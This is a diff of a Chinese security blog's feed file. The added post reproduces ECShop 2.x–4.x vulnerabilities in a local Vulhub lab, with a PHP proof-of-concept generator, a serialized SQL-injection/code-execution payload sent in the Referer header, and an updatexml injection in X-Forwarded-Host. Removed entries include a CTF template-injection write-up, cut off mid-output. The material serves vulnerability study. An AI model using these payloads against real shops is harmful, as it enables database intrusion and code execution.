+    <content><![CDATA[<h1 id="ecShop漏洞复现-2-X-3-X-4-X"><a href="#ecShop漏洞复现-2-X-3-X-4-X" class="headerlink" title="ecShop漏洞复现(2.X,3.X,4.X)"></a>ecShop漏洞复现(2.X,3.X,4.X)</h1><h2 id="漏洞环境搭建"><a href="#漏洞环境搭建" class="headerlink" title="漏洞环境搭建"></a>漏洞环境搭建</h2><p>进入漏洞文件目录，输入<code>docker-compose up -d </code></p>
+<p>启动docker容器</p>
+<img data-src="https://images.gaifagafin.top/202311082306552.png" style="zoom: 80%;" />
+
+<p>下面是ecshop2.X和3.X对应的端口映射</p>
+<img data-src="https://images.gaifagafin.top/202311082306615.png" style="zoom:67%;" />
+
+<img data-src="https://images.gaifagafin.top/202311082306822.png" style="zoom:67%;" />
+
+<p>输入<code>localhost:5004</code>安装ecshop2.X</p>
+<img data-src="https://images.gaifagafin.top/202311082306528.png" style="zoom:67%;" />
+
+<p>点击下一步</p>
+<img data-src="https://images.gaifagafin.top/202311082306521.png" style="zoom:67%;" />
+
+<p>继续点击下一步</p>
+<img data-src="https://images.gaifagafin.top/202311082307573.png" style="zoom:67%;" />
+
+<p>数据主机填<code>mysql</code>,其他随便填，点击立即安装</p>
+<img data-src="https://images.gaifagafin.top/202311082307278.png" style="zoom:67%;" />
+
+<p>安装成功</p>
+<img data-src="https://images.gaifagafin.top/202311082307228.png" style="zoom:67%;" />
+
+<p>浏览器输入localhost:5004,出现上面的页面则成功安装</p>
+<p>接下来安装ecshop3.X，步骤跟安装2.X一样，只不过安装完成后的页面是</p>
+<img data-src="https://images.gaifagafin.top/202311082307551.png" style="zoom:67%;" />
+
+<p>实际上是安装成功了的</p>
+<img data-src="https://images.gaifagafin.top/202311082307299.png" style="zoom:67%;" />
+
+<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="ecshop2-X漏洞利用"><a href="#ecshop2-X漏洞利用" class="headerlink" title="ecshop2.X漏洞利用"></a>ecshop2.X漏洞利用</h3><p>漏洞利用参考:<a href="https://paper.seebug.org/691/">https://paper.seebug.org/691/</a></p>
+<p>根据官方文档的PHP脚本生成POC</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$shell</span> = <span class="title function_ invoke__">bin2hex</span>(<span class="string">&quot;&#123;\$asd&#x27;];phpinfo\t();//&#125;xxx&quot;</span>);</span><br><span class="line"><span class="variable">$id</span> = <span class="string">&quot;-1&#x27; UNION/*&quot;</span>;</span><br><span class="line"><span class="variable">$arr</span> = [</span><br><span class="line">    <span class="string">&quot;num&quot;</span> =&gt; <span class="title function_ invoke__">sprintf</span>(<span class="string">&#x27;*/SELECT 1,0x%s,2,4,5,6,7,8,0x%s,10-- -&#x27;</span>, <span class="title function_ invoke__">bin2hex</span>(<span class="variable">$id</span>), <span class="variable">$shell</span>),</span><br><span class="line">    <span class="string">&quot;id&quot;</span> =&gt; <span class="variable">$id</span></span><br><span class="line">];</span><br><span class="line"></span><br><span class="line"><span class="variable">$s</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$arr</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$hash3</span> = <span class="string">&#x27;45ea207d7a2b68c49582d2d22adf953a&#x27;</span>;</span><br><span class="line"><span class="variable">$hash2</span> = <span class="string">&#x27;554fcae493e564ee0dc75bdf2ebf94ca&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;POC for ECShop 2.x: \n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;<span class="subst">&#123;$hash2&#125;</span>ads|<span class="subst">&#123;$s&#125;</span><span class="subst">&#123;$hash2&#125;</span>&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n\nPOC for ECShop 3.x: \n&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;<span class="subst">&#123;$hash3&#125;</span>ads|<span class="subst">&#123;$s&#125;</span><span class="subst">&#123;$hash3&#125;</span>&quot;</span>;</span><br></pre></td></tr></table></figure>
+
+<p>得到POC</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">POC <span class="keyword">for</span> ECShop <span class="number">2</span>.x: <span class="number">554</span>fcae493e564ee0dc75bdf2ebf94caads|a:<span class="number">2</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;num&quot;</span>;s:<span class="number">107</span>:<span class="string">&quot;*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275d3b706870696e666f0928293b2f2f7d787878,10-- -&quot;</span>;s:<span class="number">2</span>:<span class="string">&quot;id&quot;</span>;s:<span class="number">11</span>:<span class="string">&quot;-1&#x27; UNION/*&quot;</span>;&#125;<span class="number">554</span>fcae493e564ee0dc75bdf2ebf94ca</span><br><span class="line">POC <span class="keyword">for</span> ECShop <span class="number">3</span>.x: <span class="number">45</span>ea207d7a2b68c49582d2d22adf953aads|a:<span class="number">2</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;num&quot;</span>;s:<span class="number">107</span>:<span class="string">&quot;*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275d3b706870696e666f0928293b2f2f7d787878,10-- -&quot;</span>;s:<span class="number">2</span>:<span class="string">&quot;id&quot;</span>;s:<span class="number">11</span>:<span class="string">&quot;-1&#x27; UNION/*&quot;</span>;&#125;<span class="number">45</span>ea207d7a2b68c49582d2d22adf953a</span><br></pre></td></tr></table></figure>
+
+<p>利用burpsuite抓包将POC的内容添加到referer</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/user.php?act=login</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>127.0.0.1:5004</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en-US,en;q=0.5</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>ECS[visit_times]=2; PHPSESSID=4ba3a453e23a59625d58d1ad91e94a18; ECS_ID=b7c2c44019c15d14702c20f596ff07937ac45ba6</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>554fcae493e564ee0dc75bdf2ebf94caads|a:2:&#123;s:3:&quot;num&quot;;s:107:&quot;*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275d3b706870696e666f0928293b2f2f7d787878,10-- -&quot;;s:2:&quot;id&quot;;s:11:&quot;-1&#x27; UNION/*&quot;;&#125;554fcae493e564ee0dc75bdf2ebf94ca</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br></pre></td></tr></table></figure>
+
+<p>页面回显</p>
+<img data-src="https://images.gaifagafin.top/202311082307103.png" style="zoom:67%;" />
+
+<h3 id="ecshop3-X漏洞利用"><a href="#ecshop3-X漏洞利用" class="headerlink" title="ecshop3.X漏洞利用"></a>ecshop3.X漏洞利用</h3><p>利用burpsuite抓包将上面POC的内容添加到referer</p>
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/user.php?act=login</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:5005</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en-US,en;q=0.5</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>ECS[visit_times]=3; PHPSESSID=4ba3a453e23a59625d58d1ad91e94a18; ECS_ID=b7c2c44019c15d14702c20f596ff07937ac45ba6</span><br><span class="line"><span class="attribute">referer</span><span class="punctuation">: </span>45ea207d7a2b68c49582d2d22adf953aads|a:2:&#123;s:3:&quot;num&quot;;s:107:&quot;*/SELECT 1,0x2d312720554e494f4e2f2a,2,4,5,6,7,8,0x7b24617364275d3b706870696e666f0928293b2f2f7d787878,10-- -&quot;;s:2:&quot;id&quot;;s:11:&quot;-1&#x27; UNION/*&quot;;&#125;45ea207d7a2b68c49582d2d22adf953a</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br></pre></td></tr></table></figure>
+
+<p>页面回显</p>
+<img data-src="https://images.gaifagafin.top/202311082307207.png" style="zoom: 67%;" />
+
+<h3 id="ecshop4-x漏洞利用"><a href="#ecshop4-x漏洞利用" class="headerlink" title="ecshop4.x漏洞利用"></a>ecshop4.x漏洞利用</h3><p>漏洞环境搭建同前面一样</p>
+<p>参考文档:<a href="https://vulhub.org/#/environments/ecshop/collection_list-sqli/">https://vulhub.org/#/environments/ecshop/collection_list-sqli/</a></p>
+<p>要利用漏洞首先要注册为一个普通用户，信息随便填</p>
+<img data-src="https://images.gaifagafin.top/202311082307371.png" style="zoom:67%;" />
+
+<p>根据参考文档抓包，在包里添加字段</p>
+<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">X-Forwarded-Host: 45ea207d7a2b68c49582d2d22adf953auser_account|a:2:&#123;s:7:&quot;user_id&quot;;s:38:&quot;0&#x27;-(updatexml(1,repeat(user(),2),1))-&#x27;&quot;;s:7:&quot;payment&quot;;s:1:&quot;4&quot;;&#125;|45ea207d7a2b68c49582d2d22adf953a</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/user.php?act=collection_list</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost:5003</span><br><span class="line"><span class="attribute">X-Forwarded-Host</span><span class="punctuation">: </span>45ea207d7a2b68c49582d2d22adf953auser_account|a:2:&#123;s:7:&quot;user_id&quot;;s:38:&quot;0&#x27;-(updatexml(1,repeat(user(),2),1))-&#x27;&quot;;s:7:&quot;payment&quot;;s:1:&quot;4&quot;;&#125;|45ea207d7a2b68c49582d2d22adf953a</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en-US,en;q=0.5</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>ECS[visit_times]=4; PHPSESSID=4ba3a453e23a59625d58d1ad91e94a18; ECS_ID=53ae5332f431fa0b2d246a06d90dbf70b68310ff; real_ipd=172.22.0.1</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br></pre></td></tr></table></figure>
+
+<p>回显界面如下，得到当前数据库用户</p>
+<img data-src="https://images.gaifagafin.top/202311082307656.png" style="zoom:80%;" />
+
+]]></content>
+      <categories>
+        <category>vulhub</category>
+      </categories>
+      <tags>
+        <tag>vulhub</tag>
+        <tag>漏洞</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>使用河马对PHP Webshell进行查杀</title>
     <url>/2023/11/16/%E4%BD%BF%E7%94%A8%E6%B2%B3%E9%A9%AC%E5%AF%B9PHP-Webshell%E8%BF%9B%E8%A1%8C%E6%9F%A5%E6%9D%80/</url>
     <content><![CDATA[<h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>这里我直接使用PHPStudy2018+pikachu漏洞平台构建的环境。选择Unsafe Fileupload下的client check</p>
@@ -2215,35 +2215,6 @@
       </tags>
   </entry>
   <entry>
-    <title>博客内容测试</title>
-    <url>/2023/10/29/%E5%8D%9A%E5%AE%A2%E5%86%85%E5%AE%B9%E6%B5%8B%E8%AF%95/</url>
-    <content><![CDATA[<p><img data-src="https://s2.loli.net/2023/10/29/vjYu7sqMi8dgQbK.jpg" alt="SM.MS"></p>
-<p><img data-src="https://s2.loli.net/2023/10/29/Hns3KL4TP2qQm9f.jpg" alt="SM.MS"></p>
-<p><img data-src="https://s3.uuu.ovh/imgs/2023/11/02/e9d94fc61d21d30a.jpg" alt="ImgUrl"></p>
-<p><img data-src="https://img.gaifagafin.top/202311041048278.jpg" alt="CloudFlare R2"></p>
-<p><img data-src="https://images.gaifagafin.top/202311051019789.jpg" alt="cloudflare R2"></p>
-<p><img data-src="https://images.gaifagafin.top/202311051020956.png" alt="cloudflare R2"></p>
-<p><img data-src="https://img.gaifagafin.top/wallhaven-3z2k6y.jpg" alt="backbazeb2 8.8MB"></p>
-<p><img data-src="https://img.gaifagafin.top/wallhaven-72eq5o.jpg" alt="backbazeb2 7.7MB"></p>
-<p><img data-src="https://img.gaifagafin.top/gaifagafin.jpg" alt="backbazeb2 189KB"></p>
-<p>视频插入测试，代码为：</p>
-<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;position: relative; width: 100%; height: 0; padding-bottom: 75%;&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">iframe</span> </span></span><br><span class="line"><span class="tag"><span class="attr">src</span>=<span class="string">&quot;//player.bilibili.com/player.html?aid=534928147&amp;bvid=BV1dM41197wb&amp;cid=1307621987&amp;p=1&quot;</span>  <span class="attr">scrolling</span>=<span class="string">&quot;no&quot;</span> <span class="attr">border</span>=<span class="string">&quot;0&quot;</span> </span></span><br><span class="line"><span class="tag"><span class="attr">frameborder</span>=<span class="string">&quot;no&quot;</span> <span class="attr">framespacing</span>=<span class="string">&quot;0&quot;</span> <span class="attr">allowfullscreen</span>=<span class="string">&quot;true&quot;</span> <span class="attr">style</span>=<span class="string">&quot;position: absolute; width: 100%; </span></span></span><br><span class="line"><span class="string"><span class="tag">height: 100%; left: 0; top: 0;&quot;</span>&gt;</span> <span class="tag">&lt;/<span class="name">iframe</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
-
-
-
-<div style="position: relative; width: 100%; height: 0; padding-bottom: 75%;"><iframe 
-src="//player.bilibili.com/player.html?aid=534928147&bvid=BV1dM41197wb&cid=1307621987&p=1"  scrolling="no" border="0" 
-frameborder="no" framespacing="0" allowfullscreen="true" style="position: absolute; width: 100%; 
-height: 100%; left: 0; top: 0;"> </iframe></div>
-]]></content>
-      <categories>
-        <category>杂项</category>
-      </categories>
-      <tags>
-        <tag>picture</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>攻防世界 easytornado</title>
     <url>/2023/10/31/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C-easytornado/</url>
     <content><![CDATA[<img data-src="https://images.gaifagafin.top/202311051129114.png" style="zoom:67%;" />
@@ -2297,56 +2268,6 @@ height: 100%; left: 0; top: 0;"> </iframe></div>
       <tags>
         <tag>CTF</tag>
         <tag>攻防世界</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>攻防世界-Web_python_template_injection</title>
-    <url>/2023/10/31/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8CWeb-python-template-injection/</url>
-    <content><![CDATA[<p>第一次做模板注入的题目，参考H师傅的writeup <a href="https://blog.csdn.net/Mr_helloword/article/details/107949217">https://blog.csdn.net/Mr_helloword/article/details/107949217</a></p>
-<img data-src="https://images.gaifagafin.top/202311051131161.png" style="zoom:67%;" />
-
-<p>进入靶机网址提示</p>
-<figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line">python <span class="keyword">template</span> injection</span><br></pre></td></tr></table></figure>
-
-<p>知道这是一道python模板注入</p>
-<p>url输入 </p>
-<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">http://61.147.171.105:50859/&#123;&#123;7*7&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>页面回显</p>
-<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">http://61.147.171.105:50859/49 not found</span><br></pre></td></tr></table></figure>
-
-<p>判断存在SSTI注入</p>
-<p>查看网站模块，url输入</p>
-<figure class="highlight http"><table><tr><td class="code"><pre><span class="line">http://61.147.171.105:50859/&#123;&#123;[].__class__.__base__.__subclasses__()&#125;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>回显</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">URL http://<span class="number">61.147</span><span class="number">.171</span><span class="number">.105</span>:<span class="number">50859</span>/[&lt;<span class="built_in">type</span> <span class="string">&#x27;type&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;weakref&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;weakcallableproxy&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;weakproxy&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;int&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;basestring&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;bytearray&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;list&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;NoneType&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;NotImplementedType&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;traceback&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;super&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;xrange&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;dict&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;set&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;slice&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;staticmethod&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;complex&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;float&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;buffer&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;long&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;frozenset&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;property&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;memoryview&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;tuple&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;enumerate&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;reversed&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;code&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;frame&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;builtin_function_or_method&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;instancemethod&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;function&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;classobj&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;dictproxy&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;generator&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;getset_descriptor&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;wrapper_descriptor&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;instance&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;ellipsis&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;member_descriptor&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;file&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;PyCapsule&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;cell&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;callable-iterator&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;iterator&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;sys.long_info&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;sys.float_info&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;EncodingMap&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;fieldnameiterator&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;formatteriterator&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;sys.version_info&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;sys.flags&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;exceptions.BaseException&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;module&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;imp.NullImporter&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;zipimport.zipimporter&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;posix.stat_result&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;posix.statvfs_result&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;warnings.WarningMessage&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;warnings.catch_warnings&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_weakrefset._IterationGuard&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_weakrefset.WeakSet&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_abcoll.Hashable&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;classmethod&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_abcoll.Iterable&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_abcoll.Sized&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_abcoll.Container&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;_abcoll.Callable&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;dict_keys&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;dict_items&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;dict_values&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;site._Printer&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;site._Helper&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;_sre.SRE_Pattern&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;_sre.SRE_Match&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;_sre.SRE_Scanner&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;site.Quitter&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;codecs.IncrementalEncoder&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;codecs.IncrementalDecoder&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;functools.partial&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;operator.itemgetter&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;operator.attrgetter&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;operator.methodcaller&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;collections.deque&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;deque_iterator&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;deque_reverse_iterator&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.combinations&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.combinations_with_replacement&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.cycle&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.dropwhile&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.takewhile&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.islice&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.starmap&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.imap&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.chain&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.compress&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.ifilter&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.ifilterfalse&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.count&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.izip&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.izip_longest&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.permutations&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.product&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.repeat&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.groupby&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.tee_dataobject&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools.tee&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;itertools._grouper&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;_thread._localdummy&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;thread._local&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;thread.lock&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;Struct&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;_json.Scanner&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;_json.Encoder&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;json.decoder.JSONDecoder&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;json.encoder.JSONEncoder&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;time.struct_time&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;threading._Verbose&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;cPickle.Unpickler&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;cPickle.Pickler&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;cStringIO.StringO&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;cStringIO.StringI&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;string.Template&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;string.Formatter&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;_ssl._SSLContext&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;_ssl._SSLSocket&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;socket._closedsocket&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;_socket.socket&#x27;</span>&gt;, &lt;<span class="built_in">type</span> <span class="string">&#x27;method_descriptor&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;socket._socketobject&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;socket._fileobject&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;urlparse.ResultMixin&#x27;</span>&gt;, &lt;<span 